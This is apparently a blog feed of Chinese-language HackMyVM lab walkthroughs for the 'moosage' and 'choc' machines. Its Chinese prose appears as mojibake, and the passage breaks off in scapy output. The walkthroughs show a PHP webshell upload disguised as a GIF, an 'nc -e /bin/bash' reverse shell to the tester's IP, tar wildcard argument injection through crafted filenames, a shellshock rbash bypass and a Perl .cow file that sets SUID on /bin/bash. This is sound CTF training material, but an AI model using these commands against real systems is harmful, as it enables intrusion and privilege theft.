<br>è·å–åˆ°äº†ä¸€ä¸ª /blog/ è·¯ç”±<br><img alt="Pasted image 20241223215258" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png" referrerpolicy="no-referrer"><br><br>ç›´æ¥ç”¨é¡µé¢æºä»£ç å»githubä¸Šæœç´¢çœ‹èƒ½ä¸èƒ½æ‰¾åˆ°æºç <br>
<img alt="Pasted image 20241223215400" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215400.png" referrerpolicy="no-referrer"><br>åœ¨é¡¹ç›®æ–‡ä»¶å¤¹çš„ config.ini é‡Œé¢å¯ä»¥è·å–åˆ°é»˜è®¤å¯†ç <br>[admin]
force_login = true
nick = demo
pass = demo

[database]
db_connection = sqlite
;sqlite_db = data/sqlite.db

;[database]
;db_connection = mysql
;mysql_socket = /tmp/mysql.sock
;mysql_host = localhost
;mysql_port = 3306
;mysql_user = root
;mysql_pass = root
;db_name = blog

;[database]
;db_connection = postgres
;postgres_socket = /tmp/postgres.sock
;postgres_host = localhost
;postgres_port = 5432
;postgres_user = root
;postgres_pass = root
;db_name = blog
<br>ä½¿ç”¨é»˜è®¤ç®¡ç†å‘˜è´¦å·å¯†ç ç™»å½•åå°<br>
ç™»å½•è¿›æ¥åï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œç•™è¨€ï¼Œä½†æ²¡æœ‰ä¸Šä¼ æ–‡ä»¶ åªèƒ½ä¸Šä¼ å›¾ç‰‡<br>
<img alt="Pasted image 20241223215848" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215848.png" referrerpolicy="no-referrer"><br><br>å°è¯•ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬è¯•è¯•<br>
<img alt="Pasted image 20241223221214" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223221214.png" referrerpolicy="no-referrer"><br>
Pngä¸è¡Œ ã€‚æ¢æˆgifè¯•ä¸€ä¸‹ æˆåŠŸä¸Šä¼ <br>
<img alt="Pasted image 20241223221344" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223221344.png" referrerpolicy="no-referrer"><br>
è®¿é—®è·¯å¾„ http://192.168.56.22/blog/data/i/6d6N.php<br>
<img alt="Pasted image 20241223221419" src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223221419.png" referrerpolicy="no-referrer"><br>
æˆåŠŸã€‚<br>
åå¼¹shell<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/moosage]
â””â”€# pwncat-cs -lp 1234

[09:15:58] Welcome to pwncat ğŸˆ!                                                                  __main__.py:164
[09:16:07] received connection from 192.168.56.22:56926                                                bind.py:84
[09:16:07] 192.168.56.22:56926: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@moosage:/var/www/html/blog/data/i$ whoami
www-data
(remote) www-data@moosage:/var/www/html/blog/data/i$

<br><br>è¿›æ¥åæ“¦çœ‹ config.ini å¯ä»¥è·å–åˆ°mysqlçš„è´¦å·å¯†ç <br>(remote) www-data@moosage:/var/www/html/blog$ cat config.ini
[database]
db_connection = sqlite
;sqlite_db = data/sqlite.db

;[database]
db_connection = mysql
mysql_socket = /run/mysqld/mysqld.sock
mysql_host = localhost
mysql_port = 3306
mysql_user = baca
mysql_pass = youareinsane
db_name = moosage

<br>æ•°æ®åº“æ”¶é›†ä¿¡æ¯<br>(remote) www-data@moosage:/var/www/html/blog$ mysql -ubaca -pyouareinsane
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 51
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]&gt; show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| moosage            |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [moosage]&gt; show tables;
+-------------------+
| Tables_in_moosage |
+-------------------+
| images            |
| posts             |
+-------------------+
2 rows in set (0.000 sec)

MariaDB [moosage]&gt; select * from posts;
+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
| id | text        | plain_text  | feeling | persons | location | content | content_type | privacy | datetime            | status |
+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
|  1 | Super TEST! | Super TEST! |         |         |          |         |              | public  | 2021-04-22 14:30:01 |      1 |
+----+-------------+-------------+---------+---------+----------+---------+--------------+---------+---------------------+--------+
1 row in set (0.000 sec)

MariaDB [moosage]&gt; select * from iages;
ERROR 1146 (42S02): Table 'moosage.iages' doesn't exist
MariaDB [moosage]&gt; select * from images;
+----+-----------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
| id | name      | path            | thumb           | type | md5                              | datetime            | status |
+----+-----------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
|  1 | a.png.php | data/i/1Qkz.php | data/t/1Qkz.php | php  | 2e0d2d57db0657f87ecb595e102be2b5 | 2024-12-23 09:08:42 |      1 |
|  2 | a.png.php | NULL            | NULL            | php  | e0e6d0223f0ee718cc9c2f6d9cb9dbe7 | 2024-12-23 09:11:31 |      0 |
|  3 | a.png.php | NULL            | NULL            | php  | 072faae5bb7cf8b20677424021e215e2 | 2024-12-23 09:12:01 |      0 |
|  4 | a.gif.php | NULL            | NULL            | php  | 4dec43f548b786e903cad2b5beed121a | 2024-12-23 09:12:34 |      0 |
|  5 | a.gif.php | NULL            | NULL            | php  | 4dec43f548b786e903cad2b5beed121a | 2024-12-23 09:12:41 |      0 |
|  6 | a.gif.php | data/i/6d6N.php | data/t/6d6N.php | php  | ccf96e50f5a98a3a50bb5e963e1af038 | 2024-12-23 09:13:29 |      1 |
+----+-----------+-----------------+-----------------+------+----------------------------------+---------------------+--------+
6 rows in set (0.000 sec)

<br>å‘ç°é‡Œé¢æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„<br>ä½¿ç”¨è¿™ä¸ª baca ç”¨æˆ·çš„è´¦å·å¯†ç å‘ç°å¯ä»¥ç›´æ¥åˆ‡æ¢è´¦æˆ·<br>(remote) www-data@moosage:/var/www/html/blog$ su baca
Password:
baca@moosage:/var/www/html/blog$

<br><br>baca@moosage:~$ sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: moosage

PWNED DATE: Mon 23 Dec 2024 09:25:14 AM EST

WHOAMI: uid=1000(baca) gid=1000(baca) groups=1000(baca),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: hmvmessageme

------------------------

<br><br>å…ˆåœ¨ baca ç”¨æˆ·ç›®å½•å†™å…¥å…¬é’¥<br>baca@moosage:~$ mkdir .ssh
baca@moosage:~$ chmod 700 .ssh/
baca@moosage:~$ cd .ssh/
baca@moosage:~/.ssh$ nano authorized_keys
<br>ç„¶åsshè¿æ¥ä¸Šæ¥<br>
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/moosage]
â””â”€# ssh -i /root/.ssh/id_rsa baca@192.168.56.22
The authenticity of host '192.168.56.22 (192.168.56.22)' can't be established.
ED25519 key fingerprint is SHA256:e00X2Lw0BXoFelHR9ZRP3JogiBvwujMOAvxKJutaAMk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.22' (ED25519) to the list of known hosts.
 ___________________________
&lt; WELCOME TO MOOSAGE SYSTEM &gt;
 ---------------------------
     \
      \
        ,__, |    |
        (oo)\|    |___
        (__)\|    |   )\_
             |    |_w |  \
             |    |  ||   *

             Cower....

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Apr 22 14:04:44 2021 from 192.168.1.58
baca@moosage:~$

<br>ä»è¿™ä¸ªç‰›ç‰›è¯´è¯å°±èƒ½è”æƒ³åˆ°sshç™»å½•æ—¶ä½¿ç”¨äº† Cowsay<br>
æˆ‘ä»¬æ‰¾ä¸€ä¸‹è¿™ä¸ªcowsayæœ‰å¾ˆå¤šç§åŠ¨ç‰©å¯ä»¥é€‰æ‹©ã€‚ä½†æ˜¯æˆ‘æ¯æ¬¡ç™»å½•éƒ½æ˜¯ç‰›ç‰›åœ¨è¯´è¯ã€‚é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ç‰›ç‰›çš„é…ç½®æ–‡ä»¶å³å¯<br>baca@moosage:/usr/share/cowsay/cows$ find / -name cow* 2&gt;/dev/null
/usr/share/cowsay/cows/cower.cow

baca@moosage:/usr/share/cowsay/cows$ ls -la
total 192
drwxr-xr-x 2 root root 4096 Apr 22  2021 .
drwxr-xr-x 3 root root 4096 Apr 22  2021 ..
-rw-rw-rw- 1 root root  115 Feb  3  2019 apt.cow
-rw-rw-rw- 1 root root  310 Aug 14  1999 bud-frogs.cow
-rw-rw-rw- 1 root root  123 Aug 14  1999 bunny.cow
-rw-rw-rw- 1 root root 1127 Feb  3  2019 calvin.cow
-rw-rw-rw- 1 root root  480 Aug 14  1999 cheese.cow
-rw-rw-rw- 1 root root  181 Feb  3  2019 cock.cow
-rw-rw-rw- 1 root root  230 Aug 14  1999 cower.cow

<br>æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ cower.cow ç„¶åsshç™»å½• å®ç°ææƒ<br>
.cow æ–‡ä»¶çš„æœ¬è´¨æ˜¯Perlè„šæœ¬
<br>ä¿®æ”¹ cower.cow å†…å®¹<br>#!/usr/bin/perl
use strict; use warnings;
# è®¾ç½® SUID ä½åˆ° /bin/bash
my $file = "/bin/bash"; my $permissions = 04755; # 4 è¡¨ç¤º SUID ä½
# æ›´æ”¹æ–‡ä»¶æƒé™
if (chmod $permissions, $file) { print "Successfully set SUID bit on $file.\n";
} else {
    die "Failed to set SUID bit on $file: $!\n";
}

<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/moosage]
â””â”€# ssh -i /root/.ssh/id_rsa baca@192.168.56.22
Successfully set SUID bit on /bin/bash.
 ___________________________
&lt; WELCOME TO MOOSAGE SYSTEM &gt;
 ---------------------------

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Dec 23 10:02:42 2024 from 192.168.56.6
-bash-5.0$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-bash-5.0$ bash -p
bash-5.0#
bash-5.0# whoami
root


bash-5.0# sh flag.sh

                                   .     **
                                *           *.
                                              ,*
                                                 *,
                         ,                         ,*
                      .,                              *,
                    /                                    *
                 ,*                                        *,
               /.                                            .*.
             *                                                  **
             ,*                                               ,*
                **                                          *.
                   **                                    **.
                     ,*                                **
                        *,                          ,*
                           *                      **
                             *,                .*
                                *.           **
                                  **      ,*,
                                     ** *,
-------------------------

PWNED HOST: moosage

PWNED DATE: Mon 23 Dec 2024 10:04:58 AM EST

WHOAMI: uid=1000(baca) gid=1000(baca) groups=1000(baca),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

FLAG: Keep trying.

------------------------

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/46.moosage.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/46.moosage.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:46 GMT</pubDate><enclosure url="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="http://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241223215258.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[45.choc]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ftpåŒ¿åç™»å½•" data-href="#2.2. ftpåŒ¿åç™»å½•" href="https://www.c1trus.top/about:blank#2.2._ftpåŒ¿åç™»å½•" class="internal-link" target="_self" rel="noopener nofollow">2.2. ftpåŒ¿åç™»å½•</a>
<br><a data-tooltip-position="top" aria-label="2.3. rbashç»•è¿‡" data-href="#2.3. rbashç»•è¿‡" href="https://www.c1trus.top/about:blank#2.3._rbashç»•è¿‡" class="internal-link" target="_self" rel="noopener nofollow">2.3. rbashç»•è¿‡</a>


<br><a data-tooltip-position="top" aria-label="3. ææƒåˆ°torkiç”¨æˆ·" data-href="#3. ææƒåˆ°torkiç”¨æˆ·" href="https://www.c1trus.top/about:blank#3._ææƒåˆ°torkiç”¨æˆ·" class="internal-link" target="_self" rel="noopener nofollow">3. ææƒåˆ°torkiç”¨æˆ·</a>

<br><a data-tooltip-position="top" aria-label="3.1. taræ¼æ´ææƒ" data-href="#3.1. taræ¼æ´ææƒ" href="https://www.c1trus.top/about:blank#3.1._taræ¼æ´ææƒ" class="internal-link" target="_self" rel="noopener nofollow">3.1. taræ¼æ´ææƒ</a>


<br><a data-tooltip-position="top" aria-label="4. ææƒåˆ°sarah" data-href="#4. ææƒåˆ°sarah" href="https://www.c1trus.top/about:blank#4._ææƒåˆ°sarah" class="internal-link" target="_self" rel="noopener nofollow">4. ææƒåˆ°sarah</a>
<br><a data-tooltip-position="top" aria-label="5. ææƒroot" data-href="#5. ææƒroot" href="https://www.c1trus.top/about:blank#5._ææƒroot" class="internal-link" target="_self" rel="noopener nofollow">5. ææƒroot</a><br>
- <a data-tooltip-position="top" aria-label="5.1. sudo root æƒé™ç»•è¿‡ CVE-2019-14287" data-href="#5.1. sudo root æƒé™ç»•è¿‡ CVE-2019-14287" href="https://www.c1trus.top/about:blank#5.1._sudo_root_æƒé™ç»•è¿‡_CVE-2019-14287" class="internal-link" target="_self" rel="noopener nofollow">5.1. sudo root æƒé™ç»•è¿‡ CVE-2019-14287</a><br>
é¶æœºé“¾æ¥ <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Choc" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Choc</a><br>
ä½œè€… <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/choc]
â””â”€# nmap 192.168.56.15 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 23:44 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
ARP Ping Scan Timing: About 100.00% done; ETC: 23:44 (0:00:00 remaining)
Nmap scan report for 192.168.56.15
Host is up (0.00083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
MAC Address: 08:00:27:E3:98:E8 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.57 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/choc]
â””â”€# ftp 192.168.56.15
Connected to 192.168.56.15.
220 (vsFTPd 3.0.3)
Name (192.168.56.15:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||58838|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        114          4096 Apr 20  2021 .
drwxr-xr-x    2 0        114          4096 Apr 20  2021 ..
-rwxrwxrwx    1 0        0            1811 Apr 20  2021 id_rsa
226 Directory send OK.
ftp&gt; get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||37705|)
150 Opening BINARY mode data connection for id_rsa (1811 bytes).
100% |**********************************************************|  1811      824.88 KiB/s    00:00 ETA
226 Transfer complete.
1811 bytes received in 00:00 (647.58 KiB/s)
ftp&gt; exit
221 Goodbye.

<br>è·å–åˆ°äº†ç§é’¥,ä½†æ˜¯ä¸çŸ¥é“å¯¹åº”çš„ç”¨æˆ·å<br>æˆ‘ä»¬åˆ©ç”¨ç§é’¥ç”Ÿæˆå¯¹åº”çš„å…¬é’¥å³å¯<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/choc]
â””â”€# ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxAJzNHJ+k1YTZSCqbdmY4jXCNGuDrEeHLmsEHMDkiHpT1y+IeLVxyUurWkDwwWAes78bfHHkXbINVj7491EjoH3r4OwxhhZa4z9mtWaJlWtdllzEysC6GUr1TIPXc3vZkiPbUuAWYrz4bHbpQoIuYl+cAgOKPKbFRRhfLIOqk+1bsM+LVcWgwT5ZICpxiTOiISNAUPgInrBKkrlFott+jNPuZwTy/yV7Ix4CejknMGg1MquyP+2LyzeEpmf+OcwoS5r/jVWlSddO1Fim373lTNpDOKj2kwNsa9zO/9jAjN7uhu1mh7wb8ldU0ImCep4C6drJSTbfYOLlV7rLgfH0X carl@choc

<br>è·å–åˆ°äº†ç”¨æˆ·åæ˜¯ carl@choc<br>sshè¿æ¥åä¼šç«‹é©¬ä¸­æ–­è¿æ¥ã€‚<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/choc]
â””â”€# ssh -i id_rsa carl@192.168.56.15


##############################
#                            #
#       Welcome to my SSH !  #
#       Carl.                #
#                            #
##############################






        â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—
        â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘
        â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
        â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘    â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘
        â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
        â•šâ•â•     â•šâ•â•  â•šâ•â•â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•     â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•



Connection to 192.168.56.15 closed.

<br>çœ‹æ¥åº”è¯¥ç»™æˆ‘ä»¬äº†ä¸€ä¸ªrbash<br><br>å°è¯•ä¸€äº›æ–¹æ³•è¿›è¡Œç»•è¿‡<br>
è¿™é‡Œå¯ä»¥é€šè¿‡shellshockæ¼æ´ç»•è¿‡<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/choc]
â””â”€# ssh -i id_rsa carl@192.168.56.15 -t  "() { :; }; /bin/bash"


##############################
#                            #
#       Welcome to my SSH !  #
#       Carl.                #
#                            #
##############################


carl@choc:~$

<br><br>åœ¨ torkiç”¨æˆ· ç›®å½•ä¸‹å‘ç°ä¸€ä¸ª backup.sh å’Œä¸€ä¸ª diary.txt<br>-rw-r--r-- 1 torki torki  325 Apr 20  2021 diary.txt
carl@choc:/home/torki/secret_garden$ cat diary.txt


April 18th 2021
Last night I dreamed that I was at the beach with scarlett johansson, worst wake up call of my life!

September 12th 2309
I invented a time machine.The world is still crazy, territorial and proud !!

A day in -4.5000000000
The human doesn't exist yet and that's fucking great!!! but I'm a little bored...

<br>çŒœæµ‹è¿™ä¸ª backup.sh åº”è¯¥ä¼šè¢«å®šæ—¶æ‰§è¡Œ<br>
ä½¿ç”¨pspy64ç›‘æ§ éªŒè¯æ­£ç¡®<br>2024/12/22 06:45:01 CMD: UID=1001 PID=14411  | /bin/sh -c PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games &amp;&amp; export PATH &amp;&amp;  bash /home/sarah/.local/script.sh
2024/12/22 06:45:01 CMD: UID=1000 PID=14412  | /bin/sh -c bash /home/torki/backup.sh
2024/12/22 06:45:01 CMD: UID=1001 PID=14413  | bash /home/sarah/.local/script.sh
2024/12/22 06:45:01 CMD: UID=1000 PID=14414  | bash /home/torki/backup.sh
2024/12/22 06:45:02 CMD: UID=1002 PID=14415  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14416  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14417  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14419  | /bin/bash
2024/12/22 06:45:06 CMD: UID=1002 PID=14421  | /bin/bash
2024/12/22 06:45:10 CMD: UID=1002 PID=14423  | /bin/bash
2024/12/22 06:45:19 CMD: UID=1002 PID=14425  | /bin/bash
2024/12/22 06:46:01 CMD: UID=0    PID=14427  | /usr/sbin/CRON -f
2024/12/22 06:46:01 CMD: UID=0    PID=14426  | /usr/sbin/cron -f
2024/12/22 06:46:01 CMD: UID=0    PID=14428  | /usr/sbin/CRON -f
2024/12/22 06:46:01 CMD: UID=0    PID=14429  | /usr/sbin/CRON -f
2024/12/22 06:46:01 CMD: UID=1000 PID=14430  | /bin/sh -c bash /home/torki/backup.sh
2024/12/22 06:46:01 CMD: UID=1000 PID=14431  | bash /home/torki/backup.sh
2024/12/22 06:46:01 CMD: UID=1001 PID=14432  | /bin/sh -c PATH=.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games &amp;&amp; export PATH &amp;&amp;  bash /home/sarah/.local/script.sh
2024/12/22 06:46:01 CMD: UID=1001 PID=14433  | bash /home/sarah/.local/script.sh

<br>å¯ä»¥å‘ç°æ¯åˆ†é’Ÿ torki ç”¨æˆ·éƒ½ä¼šæ‰§è¡Œ<br>bash /home/torki/backup.sh
<br>åœ¨tmpç›®å½•ä¸‹å‘ç°ä¸€ä¸ª torki ç”¨æˆ·çš„æ–‡ä»¶  backup_home.tgz<br>carl@choc:/tmp$ ls -la
total 6988
drwxrwxrwt  8 root  root     4096 Dec 22 06:45 .
drwxr-xr-x 19 root  root     4096 Apr 18  2021 ..
-rw-r--r--  1 torki torki 3082240 Dec 22 06:45 backup_home.tgz
<br>æŠŠä»–ä¼ ä¸‹æ¥è§£å‹çœ‹ä¸€ä¸‹<br>carl@choc:/tmp$ tar -xvf backup_home.tgz
diary.txt
pspy64

carl@choc:/tmp$ cat diary.txt


April 18th 2021
Last night I dreamed that I was at the beach with scarlett johansson, worst wake up call of my life!

September 12th 2309
I invented a time machine.The world is still crazy, territorial and proud !!

A day in -4.5000000000
The human doesn't exist yet and that's fucking great!!! but I'm a little bored...

<br>
å‘ç°å°±æ˜¯ torki/secret_garden/diary.txt çš„å†…å®¹<br>
è¿™é‡Œæˆ‘è§£å‹å‡ºæ¥è¿˜æœ‰ä¸€ä¸ªpspy64çš„åŸå› æ˜¯ æˆ‘æŠŠpspy64ä¸‹åˆ°äº† torki/secret_garden/ è¿™ä¸ªç›®å½•ï¼Œä»–è¿™ä¸ªè„šæœ¬åº”è¯¥å°±æ˜¯æ‰“åŒ… torki/secret_garden/ ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶
<br>æˆ‘ä»¬å¯¹ /secret_garden/ æ˜¯æœ‰å†™å…¥æƒé™çš„<br><br><a rel="noopener nofollow" class="external-link" href="https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar" target="_blank">https://book.hacktricks.xyz/zh/linux-hardening/privilege-escalation/wildcards-spare-tricks#tar</a><br>
åœ¨ /secret_garden/  ç›®å½•ä¸‹æ‰§è¡Œå‘½ä»¤<br>carl@choc:/home/torki/secret_garden$ touch -- '--checkpoint=1'
carl@choc:/home/torki/secret_garden$ touch -- '--checkpoint-action=exec=sh shell.sh'
carl@choc:/home/torki/secret_garden$ echo 'nc -e /bin/bash 192.168.56.6 1234' &gt;shell.sh

(remote) torki@choc:/home/torki/secret_garden$ ls
'--checkpoint=1'  '--checkpoint-action=exec=sh shell.sh'   diary.txt   pspy64   shell.sh

<br>
è¿™é‡Œtouch è¦åŠ  -- çš„åŸå› æ˜¯ è®©åé¢çš„ '' ä½œä¸ºæ–‡ä»¶å,ä¸ç„¶è¿™ä¸ªå•å¼•å·ä¼šè¢«å»æ‰
<br>ç„¶åå¼€å¯ç›‘å¬ç­‰å¾…åå¼¹shell<br>
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# pwncat-cs -lp 1234

[01:07:00] Welcome to pwncat ğŸˆ!                                                        __main__.py:164
[01:08:47] received connection from 192.168.56.15:44978                                      bind.py:84
[01:08:47] 0.0.0.0:1234: normalizing shell path                                          manager.py:957
[01:08:48] 192.168.56.15:44978: registered new host w/ db                                manager.py:957
(local) pwncat$
(remote) torki@choc:/home/torki/secret_garden$ whoami
torki
(remote) torki@choc:/home/torki/secret_garden$ id
uid=1000(torki) gid=1000(torki) groups=1000(torki),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

(remote) torki@choc:/home/torki$ cat backup.sh
#!/bin/bash
cd /home/torki/secret_garden
tar cf /tmp/backup_home.tgz *
<br><br>(remote) torki@choc:/home/torki$ sudo -l
User torki may run the following commands on choc:
    (sarah) NOPASSWD: /usr/bin/scapy
<br>
scapyå¯ä»¥ç”¨æ¥å‘å„ç§åè®®çš„æ•°æ®åŒ…ï¼Œä½†æ˜¯ä»–å®é™…ä¸Šæ˜¯ä¸€ä¸ªpythonï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨åƒpythonä¸€æ ·å¼€å¯ä¸€ä¸ªshell
<br>(remote) torki@choc:/home$ sudo -u sarah scapy
WARNING: Cannot read wireshark manuf database
INFO: Can't import matplotlib. Won't be able to plot.
INFO: Can't import PyX. Won't be able to use psdump() or pdfdump().
WARNING: Failed to execute tcpdump. Check it is installed and in the PATH
WARNING: No route found for IPv6 destination :: (no default route?)
INFO: Can't import python-cryptography v1.7+. Disabled WEP decryption/encryption. (Dot11)
INFO: Can't import python-cryptography v1.7+. Disabled IPsec encryption/authentication.
WARNING: IPython not available. Using standard Python shell instead.
AutoCompletion, History are disabled.

                     aSPY//YASa
             apyyyyCY//////////YCa       |
